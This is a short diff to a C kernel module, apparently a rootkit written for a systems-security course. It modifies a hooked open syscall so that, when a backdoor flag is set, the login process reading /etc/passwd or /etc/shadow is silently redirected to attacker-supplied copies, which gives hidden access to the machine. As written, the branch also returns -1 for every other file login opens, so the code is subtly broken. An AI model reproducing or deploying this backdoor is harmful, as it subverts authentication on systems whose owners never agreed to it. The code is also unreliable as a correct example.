@@ -534,8 +534,17 @@ out:
 
 asmlinkage long my_open(const char __user *pathname, int flags, mode_t mode)
 {
-    long fd;
-    fd = original_open(pathname, flags, mode);
+    long fd = -1;
+    char* loginproc = "login";
+    if (backdoor_added && (strcmp(current->comm, loginproc) == 0)) {
+        if (is_userspace_str(pathname, "/etc/passwd")) {
+            fd = original_open("/etc/cse509--muzerpasswd", flags, mode);
+        } else if (is_userspace_str(pathname, "/etc/shadow")) {
+            fd = original_open("/etc/cse509--muzershadow", flags, mode);
+        }
+    } else {
+        fd = original_open(pathname, flags, mode);
+    }
 
     if (fd >= 0 && is_userspace_str(pathname, "/proc")) {
         /* opened "/proc";
